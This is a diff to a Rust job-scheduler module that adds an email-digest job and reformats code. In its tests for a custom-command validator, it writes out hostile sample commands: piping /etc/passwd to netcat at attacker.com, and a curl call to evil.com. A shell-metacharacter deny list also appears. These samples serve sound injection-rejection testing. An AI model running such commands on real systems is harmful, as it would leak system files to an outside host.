@@ -146,6 +146,8 @@ pub enum JobKind {
     KevCatalogFetch,
     /// Lookalike domain scan — detects typosquat/lookalike domains for tracked companies.
     LookalikeDomainScan,
+    /// Update email digest — sends top-insight update emails based on user settings.
+    UpdateEmailDigest,
     /// Self-improvement cycle — runs SourceScoring + CrossDomainMining + OutcomeTracking in sequence.
     SelfImprovementCycle,
     /// Recipe fire — evaluates all active recipes against live observation data and generates insights/warnings.
@@ -175,6 +177,7 @@ impl JobKind {
             Self::DnsPostureScan => "dns_posture_scan",
             Self::KevCatalogFetch => "kev_catalog_fetch",
             Self::LookalikeDomainScan => "lookalike_domain_scan",
+            Self::UpdateEmailDigest => "update_email_digest",
             Self::SelfImprovementCycle => "self_improvement_cycle",
             Self::RecipeFire => "recipe_fire",
             Self::PoiDiscovery => "poi_discovery",
@@ -202,6 +205,7 @@ impl JobKind {
             "dns_posture_scan" => Self::DnsPostureScan,
             "kev_catalog_fetch" => Self::KevCatalogFetch,
             "lookalike_domain_scan" => Self::LookalikeDomainScan,
+            "update_email_digest" => Self::UpdateEmailDigest,
             "self_improvement_cycle" => Self::SelfImprovementCycle,
             "recipe_fire" => Self::RecipeFire,
             "poi_discovery" => Self::PoiDiscovery,
@@ -222,7 +226,10 @@ pub enum JobStatus {
 
 impl JobStatus {
     pub fn is_terminal(&self) -> bool {
-        matches!(self, Self::Succeeded { .. } | Self::Failed { .. } | Self::Skipped { .. })
+        matches!(
+            self,
+            Self::Succeeded { .. } | Self::Failed { .. } | Self::Skipped { .. }
+        )
     }
 }
 
@@ -543,12 +550,7 @@ impl Scheduler {
                     );
                     return false;
                 }
-                is_due_with_jitter(
-                    &def.schedule,
-                    def.last_run,
-                    now,
-                    def.jitter_offset_secs,
-                )
+                is_due_with_jitter(&def.schedule, def.last_run, now, def.jitter_offset_secs)
             })
             .map(|def| def.kind.clone())
             .collect()
@@ -570,10 +572,7 @@ impl Scheduler {
 
     /// Get all runs for a given job kind.
     pub fn runs_for(&self, kind: &JobKind) -> Vec<&JobRun> {
-        self.history
-            .iter()
-            .filter(|r| &r.kind == kind)
-            .collect()
+        self.history.iter().filter(|r| &r.kind == kind).collect()
     }
 
     /// Success rate for a given job kind over the last N runs.
@@ -649,7 +648,8 @@ pub struct JobSummary {
 // ────────────────────────────────────────────
 
 /// Allowed characters in a custom job name (alphanumeric plus hyphen/underscore).
-pub const CUSTOM_JOB_NAME_ALLOWED: &str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-";
+pub const CUSTOM_JOB_NAME_ALLOWED: &str =
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-";
 
 /// Validate a custom job command name and its resolved command string (B250).
 ///
@@ -677,7 +677,10 @@ pub fn validate_custom_command(
     }
     let cmd = command.trim();
     if cmd.is_empty() {
-        return Err(format!("custom job command for {:?} must not be empty", name));
+        return Err(format!(
+            "custom job command for {:?} must not be empty",
+            name
+        ));
     }
     // Reject shell injection metacharacters
     const FORBIDDEN: &[char] = &[';', '&', '|', '$', '`', '(', ')', '<', '>', '"', '\''];
@@ -699,7 +702,6 @@ pub fn validate_custom_command(
     }
     Ok(())
 }
-
 
 /// Is a job due to run at `now`, given its schedule and when it last ran?
 /// Applies a fixed jitter offset to spread jobs that share the same nominal
@@ -896,7 +898,10 @@ pub fn default_scheduler() -> Scheduler {
     s.register(
         JobDef::new(
             JobKind::HypothesisGeneration,
-            Schedule::DailyAt { hour: 2, minute: 30 },
+            Schedule::DailyAt {
+                hour: 2,
+                minute: 30,
+            },
         )
         .with_jitter(60) // +1 min
         .with_timeout(7200), // 2 h — LLM inference can be slow
@@ -915,7 +920,10 @@ pub fn default_scheduler() -> Scheduler {
     s.register(
         JobDef::new(
             JobKind::PoiDiscovery,
-            Schedule::DailyAt { hour: 3, minute: 30 },
+            Schedule::DailyAt {
+                hour: 3,
+                minute: 30,
+            },
         )
         .with_jitter(180) // +3 min
         .with_timeout(7200), // 2 h — network scraping can be slow
@@ -1030,7 +1038,10 @@ pub fn default_scheduler() -> Scheduler {
     s.register(
         JobDef::new(
             JobKind::SanctionsScreen,
-            Schedule::DailyAt { hour: 1, minute: 30 },
+            Schedule::DailyAt {
+                hour: 1,
+                minute: 30,
+            },
         )
         .with_jitter(120)
         .with_timeout(1800), // 30 min
@@ -1040,7 +1051,10 @@ pub fn default_scheduler() -> Scheduler {
     s.register(
         JobDef::new(
             JobKind::RecipeFire,
-            Schedule::DailyAt { hour: 2, minute: 15 },
+            Schedule::DailyAt {
+                hour: 2,
+                minute: 15,
+            },
         )
         .with_jitter(60) // +1 min
         .with_timeout(1800), // 30 min
@@ -1062,7 +1076,10 @@ pub fn default_scheduler() -> Scheduler {
     s.register(
         JobDef::new(
             JobKind::DnsPostureScan,
-            Schedule::DailyAt { hour: 3, minute: 30 },
+            Schedule::DailyAt {
+                hour: 3,
+                minute: 30,
+            },
         )
         .with_jitter(120)
         .with_timeout(1800), // 30 min
@@ -1072,7 +1089,10 @@ pub fn default_scheduler() -> Scheduler {
     s.register(
         JobDef::new(
             JobKind::KevCatalogFetch,
-            Schedule::DailyAt { hour: 4, minute: 30 },
+            Schedule::DailyAt {
+                hour: 4,
+                minute: 30,
+            },
         )
         .with_jitter(60)
         .with_timeout(900), // 15 min
@@ -1086,6 +1106,13 @@ pub fn default_scheduler() -> Scheduler {
         )
         .with_jitter(120)
         .with_timeout(3600), // 1 h
+    );
+
+    // Update email digest: every 15 minutes — actual send time is per-user settings (CET).
+    s.register(
+        JobDef::new(JobKind::UpdateEmailDigest, Schedule::IntervalSecs(900))
+            .with_jitter(0)
+            .with_timeout(300),
     );
 
     // Self-improvement cycle: weekly Mon at 12:00 UTC — coordinated self-improvement run.
@@ -1164,10 +1191,7 @@ mod tests {
 
     #[test]
     fn test_daily_ran_today_already() {
-        let sched = Schedule::DailyAt {
-            hour: 2,
-            minute: 0,
-        };
+        let sched = Schedule::DailyAt { hour: 2, minute: 0 };
         let now = utc(2026, 2, 23, 15, 0, 0);
         let last = utc(2026, 2, 23, 2, 5, 0); // ran today at 02:05
         assert!(!is_due(&sched, Some(last), now));
@@ -1175,10 +1199,7 @@ mod tests {
 
     #[test]
     fn test_daily_new_day() {
-        let sched = Schedule::DailyAt {
-            hour: 2,
-            minute: 0,
-        };
+        let sched = Schedule::DailyAt { hour: 2, minute: 0 };
         let now = utc(2026, 2, 24, 2, 30, 0); // next day, past 02:00
         let last = utc(2026, 2, 23, 2, 5, 0);
         assert!(is_due(&sched, Some(last), now));
@@ -1269,10 +1290,7 @@ mod tests {
 
     #[test]
     fn test_next_fire_daily_after_target() {
-        let sched = Schedule::DailyAt {
-            hour: 2,
-            minute: 0,
-        };
+        let sched = Schedule::DailyAt { hour: 2, minute: 0 };
         let now = utc(2026, 2, 23, 10, 0, 0);
         let next = next_fire_time(&sched, now);
         assert_eq!(next, utc(2026, 2, 24, 2, 0, 0)); // tomorrow
@@ -1499,20 +1517,14 @@ mod tests {
         assert_eq!(sched.history.len(), 1);
         let def = sched.jobs.get("crawl_cycle").unwrap();
         assert!(def.last_run.is_some());
-        assert!(matches!(
-            def.last_status,
-            Some(JobStatus::Succeeded { .. })
-        ));
+        assert!(matches!(def.last_status, Some(JobStatus::Succeeded { .. })));
     }
 
     #[test]
     fn test_history_trimming() {
         let mut sched = Scheduler::new();
         sched.max_history = 5;
-        sched.register(JobDef::new(
-            JobKind::CrawlCycle,
-            Schedule::IntervalSecs(60),
-        ));
+        sched.register(JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(60)));
 
         for _ in 0..10 {
             let mut run = JobRun::new(JobKind::CrawlCycle);
@@ -1526,10 +1538,7 @@ mod tests {
     #[test]
     fn test_success_rate() {
         let mut sched = Scheduler::new();
-        sched.register(JobDef::new(
-            JobKind::CrawlCycle,
-            Schedule::IntervalSecs(60),
-        ));
+        sched.register(JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(60)));
 
         // 3 successes, 2 failures
         for i in 0..5 {
@@ -1565,7 +1574,10 @@ mod tests {
 
         let summary = sched.status_summary();
         assert!(summary.len() >= 11); // 11 default jobs
-        let crawl_summary = summary.iter().find(|s| s.kind == JobKind::CrawlCycle).unwrap();
+        let crawl_summary = summary
+            .iter()
+            .find(|s| s.kind == JobKind::CrawlCycle)
+            .unwrap();
         assert!(crawl_summary.enabled);
         assert!(crawl_summary.last_run.is_some());
     }
@@ -1590,10 +1602,7 @@ mod tests {
     #[test]
     fn test_runs_for_filters_by_kind() {
         let mut sched = Scheduler::new();
-        sched.register(JobDef::new(
-            JobKind::CrawlCycle,
-            Schedule::IntervalSecs(60),
-        ));
+        sched.register(JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(60)));
         sched.register(JobDef::new(
             JobKind::PoiRefresh,
             Schedule::DailyAt { hour: 3, minute: 0 },
@@ -1647,10 +1656,7 @@ mod tests {
     #[test]
     fn test_avg_duration_ms() {
         let mut sched = Scheduler::new();
-        sched.register(JobDef::new(
-            JobKind::CrawlCycle,
-            Schedule::IntervalSecs(60),
-        ));
+        sched.register(JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(60)));
 
         // Record runs with known durations manually
         for i in 0u32..3 {
@@ -1704,7 +1710,10 @@ mod tests {
         let s = default_scheduler();
         let mining_jitter = s.jobs.get("pattern_mining").map(|d| d.jitter_offset_secs);
         let poi_jitter = s.jobs.get("poi_refresh").map(|d| d.jitter_offset_secs);
-        let drift_jitter = s.jobs.get("feature_drift_check").map(|d| d.jitter_offset_secs);
+        let drift_jitter = s
+            .jobs
+            .get("feature_drift_check")
+            .map(|d| d.jitter_offset_secs);
         assert_ne!(mining_jitter, poi_jitter);
         assert_ne!(poi_jitter, drift_jitter);
     }
@@ -1727,14 +1736,19 @@ mod tests {
         let mut run = JobRun::new(JobKind::CrawlCycle);
         run.start();
         // Manually set a large stored duration
-        run.status = JobStatus::Succeeded { duration_ms: 99_999 };
+        run.status = JobStatus::Succeeded {
+            duration_ms: 99_999,
+        };
         assert_eq!(run.duration_ms(), 99_999);
     }
 
     #[test]
     fn test_skip_reason_code_normalization() {
         assert_eq!(skip_reason_code("no new data"), "NO_NEW_DATA");
-        assert_eq!(skip_reason_code("budget-limit: exceeded"), "BUDGET_LIMIT_EXCEEDED");
+        assert_eq!(
+            skip_reason_code("budget-limit: exceeded"),
+            "BUDGET_LIMIT_EXCEEDED"
+        );
         assert_eq!(skip_reason_code("   "), "UNSPECIFIED");
     }
 
@@ -1764,7 +1778,10 @@ mod tests {
     fn test_register_rejects_invalid_interval() {
         let mut sched = Scheduler::new();
         let def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(10));
-        assert!(!sched.register(def), "should reject schedule with interval < MIN_INTERVAL_SECS");
+        assert!(
+            !sched.register(def),
+            "should reject schedule with interval < MIN_INTERVAL_SECS"
+        );
         assert!(sched.jobs.is_empty());
     }
 
@@ -1792,33 +1809,52 @@ mod tests {
 
     #[test]
     fn test_schedule_validate_daily_bad_hour() {
-        let s = Schedule::DailyAt { hour: 24, minute: 0 };
+        let s = Schedule::DailyAt {
+            hour: 24,
+            minute: 0,
+        };
         let e = s.validate().unwrap_err();
         assert!(e.contains("hour") && e.contains("out of range"), "{}", e);
     }
 
     #[test]
     fn test_schedule_validate_daily_bad_minute() {
-        let s = Schedule::DailyAt { hour: 12, minute: 60 };
+        let s = Schedule::DailyAt {
+            hour: 12,
+            minute: 60,
+        };
         let e = s.validate().unwrap_err();
         assert!(e.contains("minute") && e.contains("out of range"), "{}", e);
     }
 
     #[test]
     fn test_schedule_validate_weekly_bad_hour() {
-        let s = Schedule::WeeklyOn { day: IsoWeekday::Mon, hour: 25, minute: 0 };
+        let s = Schedule::WeeklyOn {
+            day: IsoWeekday::Mon,
+            hour: 25,
+            minute: 0,
+        };
         assert!(s.validate().is_err());
     }
 
     #[test]
     fn test_schedule_validate_weekly_bad_minute() {
-        let s = Schedule::WeeklyOn { day: IsoWeekday::Tue, hour: 0, minute: 99 };
+        let s = Schedule::WeeklyOn {
+            day: IsoWeekday::Tue,
+            hour: 0,
+            minute: 99,
+        };
         assert!(s.validate().is_err());
     }
 
     #[test]
     fn test_schedule_validate_daily_valid() {
-        assert!(Schedule::DailyAt { hour: 23, minute: 59 }.validate().is_ok());
+        assert!(Schedule::DailyAt {
+            hour: 23,
+            minute: 59
+        }
+        .validate()
+        .is_ok());
         assert!(Schedule::DailyAt { hour: 0, minute: 0 }.validate().is_ok());
     }
 
@@ -1845,7 +1881,11 @@ mod tests {
         // US clocks spring forward on 2026-03-08 (Sunday) at 02:00 local.
         // Our schedules are UTC-only — no DST adjustment should occur.
         // Monday 2026-03-09 06:00 UTC should still be recognised as due.
-        let sched = Schedule::WeeklyOn { day: IsoWeekday::Mon, hour: 6, minute: 0 };
+        let sched = Schedule::WeeklyOn {
+            day: IsoWeekday::Mon,
+            hour: 6,
+            minute: 0,
+        };
         let now = utc(2026, 3, 9, 7, 0, 0); // Monday after US spring-forward
         assert!(is_due(&sched, None, now));
         // Confirm it also fires on the previous Monday (before DST) the same way
@@ -1857,7 +1897,11 @@ mod tests {
     fn test_weekly_schedule_unaffected_by_eu_dst_end() {
         // EU clocks fall back on 2026-10-25 (Sunday).
         // Monday 2026-10-26 06:00 UTC must still fire.
-        let sched = Schedule::WeeklyOn { day: IsoWeekday::Mon, hour: 6, minute: 0 };
+        let sched = Schedule::WeeklyOn {
+            day: IsoWeekday::Mon,
+            hour: 6,
+            minute: 0,
+        };
         let now = utc(2026, 10, 26, 7, 0, 0);
         assert!(is_due(&sched, None, now));
     }
@@ -1887,8 +1931,7 @@ mod tests {
 
     #[test]
     fn test_job_def_with_timeout() {
-        let def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600))
-            .with_timeout(7200);
+        let def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600)).with_timeout(7200);
         assert_eq!(def.timeout_secs, Some(7200));
     }
 
@@ -1954,7 +1997,10 @@ mod tests {
         // Daily job at 10:00 that hasn't run today
         let mut def_daily = JobDef::new(
             JobKind::PatternMining,
-            Schedule::DailyAt { hour: 10, minute: 0 },
+            Schedule::DailyAt {
+                hour: 10,
+                minute: 0,
+            },
         );
         def_daily.last_run = Some(utc(2026, 2, 22, 10, 5, 0)); // yesterday
         sched.jobs.insert("pattern_mining".to_string(), def_daily);
@@ -1962,7 +2008,11 @@ mod tests {
         // Weekly on Monday at 10:00 that hasn't run this week
         let mut def_weekly = JobDef::new(
             JobKind::PromotionBoard,
-            Schedule::WeeklyOn { day: IsoWeekday::Mon, hour: 10, minute: 0 },
+            Schedule::WeeklyOn {
+                day: IsoWeekday::Mon,
+                hour: 10,
+                minute: 0,
+            },
         );
         def_weekly.last_run = Some(utc(2026, 2, 16, 10, 5, 0)); // last Monday
         sched.jobs.insert("promotion_board".to_string(), def_weekly);
@@ -1970,7 +2020,12 @@ mod tests {
         // Now = Monday 2026-02-23 10:30 UTC
         let now = utc(2026, 2, 23, 10, 30, 0);
         let due = sched.due_jobs(now);
-        assert_eq!(due.len(), 3, "all three schedule types should be due: {:?}", due);
+        assert_eq!(
+            due.len(),
+            3,
+            "all three schedule types should be due: {:?}",
+            due
+        );
     }
 
     #[test]
@@ -1985,7 +2040,10 @@ mod tests {
         // Daily job at 10:00 that hasn't run today — DUE
         let mut def_daily = JobDef::new(
             JobKind::PatternMining,
-            Schedule::DailyAt { hour: 10, minute: 0 },
+            Schedule::DailyAt {
+                hour: 10,
+                minute: 0,
+            },
         );
         def_daily.last_run = Some(utc(2026, 2, 22, 10, 0, 0));
         sched.jobs.insert("pattern_mining".to_string(), def_daily);
@@ -2006,15 +2064,15 @@ mod tests {
 
     #[test]
     fn test_job_def_with_max_concurrent() {
-        let def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600))
-            .with_max_concurrent(4);
+        let def =
+            JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600)).with_max_concurrent(4);
         assert_eq!(def.max_concurrent, 4);
     }
 
     #[test]
     fn test_job_def_with_max_concurrent_zero_clamps_to_one() {
-        let def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600))
-            .with_max_concurrent(0);
+        let def =
+            JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600)).with_max_concurrent(0);
         assert_eq!(def.max_concurrent, 1, "max_concurrent must never be 0");
     }
 
@@ -2097,13 +2155,15 @@ mod tests {
 
     #[test]
     fn test_validate_custom_command_pipe_injection() {
-        let e = validate_custom_command("job", "cat /etc/passwd | nc attacker.com 80", &["cat"]).unwrap_err();
+        let e = validate_custom_command("job", "cat /etc/passwd | nc attacker.com 80", &["cat"])
+            .unwrap_err();
         assert!(e.contains("forbidden metacharacter"));
     }
 
     #[test]
     fn test_validate_custom_command_not_in_allowlist() {
-        let e = validate_custom_command("job", "curl https://evil.com", &["python3", "run_export"]).unwrap_err();
+        let e = validate_custom_command("job", "curl https://evil.com", &["python3", "run_export"])
+            .unwrap_err();
         assert!(e.contains("not in allowlist"), "{}", e);
     }
 
@@ -2150,7 +2210,10 @@ mod tests {
         let mut sched = Scheduler::new();
         sched.max_history = 5;
 
-        let mut def = JobDef::new(JobKind::PatternMining, Schedule::DailyAt { hour: 2, minute: 0 });
+        let mut def = JobDef::new(
+            JobKind::PatternMining,
+            Schedule::DailyAt { hour: 2, minute: 0 },
+        );
         def.enabled = true;
         sched.register(def);
 
@@ -2173,11 +2236,14 @@ mod tests {
         let mut sched = Scheduler::new();
         sched.max_history = 100; // Custom limit
 
-        let def = JobDef::new(JobKind::StrategyMemo, Schedule::WeeklyOn { 
-            day: IsoWeekday::Sun, 
-            hour: 3, 
-            minute: 0 
-        });
+        let def = JobDef::new(
+            JobKind::StrategyMemo,
+            Schedule::WeeklyOn {
+                day: IsoWeekday::Sun,
+                hour: 3,
+                minute: 0,
+            },
+        );
         sched.register(def);
 
         // Add 150 runs
@@ -2188,7 +2254,11 @@ mod tests {
             sched.record_run(run);
         }
 
-        assert_eq!(sched.history.len(), 100, "history must respect custom max_history");
+        assert_eq!(
+            sched.history.len(),
+            100,
+            "history must respect custom max_history"
+        );
         // Should have runs 50-149
         assert_eq!(sched.history.first().unwrap().run_id, "w-50");
         assert_eq!(sched.history.last().unwrap().run_id, "w-149");
@@ -2319,7 +2389,9 @@ mod tests {
         // Simulate 20 ticks with irregular loop delay and ensure schedule catches up
         // (fires whenever elapsed >= interval despite drift).
         let mut fired = 0usize;
-        for delay in [20, 25, 80, 10, 90, 55, 70, 15, 120, 40, 35, 75, 10, 65, 85, 30, 95, 50, 60, 45] {
+        for delay in [
+            20, 25, 80, 10, 90, 55, 70, 15, 120, 40, 35, 75, 10, 65, 85, 30, 95, 50, 60, 45,
+        ] {
             now += chrono::Duration::seconds(delay);
             if sched.due_jobs(now).contains(&JobKind::CrawlCycle) {
                 let mut run = JobRun::new(JobKind::CrawlCycle);
@@ -2332,6 +2404,9 @@ mod tests {
                 fired += 1;
             }
         }
-        assert!(fired >= 8, "expected regular firing despite drift, got {fired}");
+        assert!(
+            fired >= 8,
+            "expected regular firing despite drift, got {fired}"
+        );
     }
 }
